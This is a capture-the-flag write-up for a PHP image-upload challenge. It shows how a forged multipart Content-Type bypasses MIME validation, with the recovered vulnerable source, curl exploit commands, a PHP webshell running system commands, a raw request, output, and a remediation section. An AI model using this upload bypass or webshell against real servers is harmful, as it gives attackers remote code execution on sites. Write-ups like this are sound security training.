# Blank Space — CTF Writeup

**Challenge:** Blank Space (300 pts)
**Category:** Web
**Target:** `http://54.72.82.22:8160`
**Flag:** `safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}`

> Every blank wall is an invitation. The gallery is open, the canvas is yours, and submissions are accepted without question. Upload your masterpiece and see where it takes you.

---

## 1. TL;DR

The app is a "street art gallery" that accepts image uploads. It validates the file
type using **`$_FILES['uploaded_file']['type']`** — a value the **client** supplies in
the multipart `Content-Type` header — instead of inspecting the file's actual bytes
(`finfo_file`). Because that value is fully attacker-controlled, the image allow-list
is trivially bypassed.

Once the file passes validation, the app checks whether the **filename** contains the
string `.php` and, if so, prints the flag directly in the HTTP response. The upload
lands in a web-served directory and is executed by PHP, so the same primitive also
yields **unauthenticated remote code execution** as `www-data`.

**One-liner:**

```bash
curl -F "uploaded_file=@masterpiece.php;type=image/gif" http://54.72.82.22:8160/
```

---

## 2. Reconnaissance

### 2.1 Service fingerprint

```
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.35
Content-Type: text/html; charset=UTF-8
```

Debian 13.7, Apache 2.4.68, PHP 8.3.35 (CLI build reported by `php -v`).

### 2.2 Endpoint discovery

| Path | Status | Note |
|---|---|---|
| `/` , `/index.php` | 200 | Upload form |
| `/uploads/` | 403 | Directory listing denied — but files are still served by name |
| `/uploads/<file>` | 200 | Uploaded files are publicly reachable |
| `/robots.txt`, `/sitemap.xml`, `/admin`, `/login`, `/api`, `/health` | 404 | |
| `/server-status` | 403 | |
| `/.git/HEAD` | 404 | |

### 2.3 Automated scan (HexStrike → Nikto v2.6.1)

```
+ Server: Apache/2.4.68 (Debian)
+ [000287] /: Retrieved x-powered-by header: PHP/8.3.35.
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [999967] /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ [013587] /: Suggested security header missing: x-content-type-options.
+ [013587] /: Suggested security header missing: content-security-policy.
+ [013587] /: Suggested security header missing: permissions-policy.
+ [013587] /: Suggested security header missing: referrer-policy.
+ [013587] /: Suggested security header missing: strict-transport-security.
+ [600625] PHP/8.3.35 appears to be outdated (current is at least 8.5.8).
```

Nikto found no *direct* upload finding — expected, since the flaw only manifests when a
request carries an attacker-chosen part-level `Content-Type`, which a generic scanner
does not send. Version disclosure and missing security headers are noted but are not
the path to the flag. (An `nmap -sV` reported "host seems down" — ICMP is filtered;
`-Pn` is required for that host.)

### 2.4 The form

```html
<form method="POST" enctype="multipart/form-data">
    <label for="file_input">Choose File:</label>
    <input type="file" name="uploaded_file" id="file_input" required>
    <input type="submit" value="Upload File">
</form>
```

Single field: **`uploaded_file`**. No CSRF token, no authentication.

### 2.5 Baseline behaviour (probing the validator)

Uploading four files with curl's inferred content types:

| File | Inferred Content-Type | Result |
|---|---|---|
| `a.txt` | `text/plain` | ❌ `File type (MIME: text/plain) is not allowed! Only image/jpeg, image/png, image/gif are accepted.` |
| `a.php` | `application/octet-stream` | ❌ `File type (MIME: application/octet-stream) is not allowed!` |
| `a.gif.php` | `application/octet-stream` | ❌ `application/octet-stream` |
| `a.gif` | `image/gif` | ✅ `Uploaded file URL: /uploads/a.gif` |

The rejected MIME strings are exactly what curl guessed from the *extension* — nobody
read the file contents. That is a strong smell that the server is echoing back a
value it received rather than one it computed. Confirming the hypothesis:

```bash
# .php file, but tell curl to declare it as an image
curl -F "uploaded_file=@p.php;type=image/gif" http://54.72.82.22:8160/
```

Result:

```html
<div class="message-box success"><strong>SUCCESS:</strong></div>
<p>Uploaded file URL: <a href="/uploads/p.php">/uploads/p.php</a></p>
<div class="message-box success"><strong>Your Art Is:</strong> <code>safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}</code></div>
```

✅ **Validation bypassed, and the flag is disclosed immediately.**

---

## 3. Root-cause analysis (recovered source)

The upload handler was recovered from the box (`/var/www/html/index.php`, lines 168–215):

```php
<?php
$upload_dir = 'uploads/';
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

// Ensure the uploads directory exists and is writable
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $file = $_FILES['uploaded_file'];
    $upload_path = $upload_dir . basename($file['name']);

    if (!in_array($file['type'], $allowed_mimes)) {          // <-- BUG #1
        echo '<div class="message-box error"><strong>ERROR:</strong> File type (MIME: '
             . htmlspecialchars($file['type']) . ') is not allowed! ...</div>';
    }
    else {
        if (move_uploaded_file($file['tmp_name'], $upload_path)) {
            echo '<div class="message-box success"><strong>SUCCESS:</strong></div>';
            echo '<p>Uploaded file URL: <a href="/' . htmlspecialchars($upload_path) . '">/'
                 . htmlspecialchars($upload_path) . '</a></p>';

            // Set the challenge "flag" condition
            if (strpos($file['name'], '.php') !== false) {   // <-- BUG #2
                $flag_path = 'flag.txt';
                $flag_content = getenv('FLAG') ?: file_get_contents($flag_path);
                echo '<div class="message-box success"><strong>Your Art Is:</strong> <code>'
                     . htmlspecialchars($flag_content) . '</code></div>';
            }
        } else {
            echo '<div class="message-box error"><strong>ERROR:</strong> There was an error uploading your file.</div>';
        }
    }
}
?>
```

Three distinct flaws:

1. **Client-controlled MIME validation (CWE-434 / CWE-807).**
   `$file['type']` is populated by PHP straight from the multipart part header
   `Content-Type:`. It is **attacker input**, not a property of the file. Anything
   claiming to be `image/gif` is accepted — the actual bytes are never inspected.

2. **Extension check is a substring match, and it gates the flag (CWE-430).**
   `strpos($file['name'], '.php') !== false` matches `shell.php`, `shell.php.jpg`,
   `x.php.png`, `malware.php.txt` — and importantly it is what makes the app print
   the flag. The check is both too weak as a security control *and* it is the
   intended flag trigger.

3. **Attacker-controlled filename + executable upload directory (CWE-434).**
   `basename($file['name'])` preserves the extension, and the file is written into a
   web-served directory. `uploads/.htaccess` compounds this:

   ```apache
   AddType application/x-httpd-php .gif .jpg .png
   ```

   Any file with an image extension is handed to the PHP interpreter, so even a
   "properly" MIME-validated `.gif` containing `<?php … ?>` executes. There is a
   second, independent RCE path here.

### The flag's source

```bash
$ cat /var/www/html/flag.txt
safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

The app prefers `getenv('FLAG')` and falls back to `flag.txt`. Both hold the same value.

---

## 4. Exploitation

### 4.1 Minimum viable exploit (flag)

```bash
# Payload content is irrelevant to the flag condition — only the name matters.
printf '<?php echo "ART"; ?>' > masterpiece.php

curl -F "uploaded_file=@masterpiece.php;type=image/gif" http://54.72.82.22:8160/
```

Verified output (exact HTML as returned):

```html
<div class="message-box success"><strong>SUCCESS:</strong></div>
<p>Uploaded file URL: <a href="/uploads/masterpiece.php" target="_blank">/uploads/masterpiece.php</a></p>
<div class="message-box success"><strong>Your Art Is:</strong> <code>safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}</code></div>
```

### 4.2 Raw request

```http
POST / HTTP/1.1
Host: 54.72.82.22:8160
User-Agent: curl/8.21.0
Accept: */*
Content-Length: 233
Content-Type: multipart/form-data; boundary=------------------------67cTKMTYBIjS65TUG0or8G

--------------------------67cTKMTYBIjS65TUG0or8G
Content-Disposition: form-data; name="uploaded_file"; filename="masterpiece.php"
Content-Type: image/gif            <-- the lie that defeats the allow-list

<?php echo "ART"; ?>
--------------------------67cTKMTYBIjS65TUG0or8G--
```

The critical line is `Content-Type: image/gif` inside the **part header**, not the
request header.

### 4.3 Escalation to RCE (bonus)

The identical primitive drops a working webshell:

```bash
printf '<?php system($_GET["c"]); ?>' > sh.php
curl -F "uploaded_file=@sh.php;type=image/gif" http://54.72.82.22:8160/
curl "http://54.72.82.22:8160/uploads/sh.php?c=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell in `/var/www/html/uploads`, flag file readable:

```bash
curl "http://54.72.82.22:8160/uploads/sh.php?c=pwd"
# /var/www/html/uploads

curl "http://54.72.82.22:8160/uploads/sh.php?c=cat%20/var/www/html/flag.txt"
# safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

Note the target was heavily pre-shared — `shell.php`, `poly.gif`, `shell.php%00.gif`,
`..%2F..%2Ftmp%2Fpwned.png` and dozens of other participants' payloads were sitting in
`uploads/`. Each upload response masks nothing: anyone can enumerate everyone's shells
because directory listing is 403 but filenames are guessable and served on request.

---

## 5. Flag

```
safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

---

## 6. Remediation

1. **Never trust `$_FILES['type']`.** Determine the type server-side from the bytes:

   ```php
   $finfo = new finfo(FILEINFO_MIME_TYPE);
   $real  = $finfo->file($file['tmp_name']);          // e.g. "image/png"
   if (!in_array($real, ['image/jpeg','image/png','image/gif'], true)) { reject(); }
   ```

2. **Re-encode images** (`imagecreatefrom*` → `image*`) instead of moving the raw
   upload. This destroys embedded PHP and strips polyglots.

3. **Generate the stored filename server-side** (`bin2hex(random_bytes(16)) . $safe_ext`)
   and never let the user's name reach the filesystem. Reject any name containing a
   path separator or null byte.

4. **Stop executing anything in the upload directory:**

   ```apache
   php_flag engine off
   <FilesMatch "\.(php|phtml|phar|php[0-9]|pht)$">
       Require all denied
   </FilesMatch>
   ```

   The `AddType application/x-httpd-php .gif .jpg .png` line in `uploads/.htaccess`
   must be removed — it makes every image a potential webshell.

5. **Serve uploads from a separate origin / bucket** with `Content-Disposition:
   attachment` and a non-executable content type.

6. **Do not print the flag (or any secret) based on user-controlled input.**
   The `.php` substring check is an Easter egg, not a security control — it hands the
   flag to anyone who reads the challenge page and lies about a MIME type.

---

## Appendix A — Artefacts

| File | Purpose |
|---|---|
| `exploit/upload_bypass.sh` | Minimal bash PoC — uploads a `.php` with forged MIME and greps the flag |
| `exploit/exploit.py` | Python PoC — flag disclosure + RCE confirmation + `flag.txt` read |
| `exploit/shell.php` | The webshell payload |

## Appendix B — Verification runs

```console
$ ./exploit/upload_bypass.sh http://54.72.82.22:8160
[*] Uploading masterpiece.php with forged Content-Type: image/gif
[+] FLAG: safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

```console
$ curl "http://54.72.82.22:8160/uploads/masterpiece.php"
ART

$ curl "http://54.72.82.22:8160/uploads/sh.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Appendix C — Why "Blank Space"?

The challenge name is the tell: the file's *contents* are a blank space as far as the
validator is concerned. Nothing about the bytes is ever checked — only the label the
attacker attaches to them. The wall is blank because the paint is whatever you say
it is.
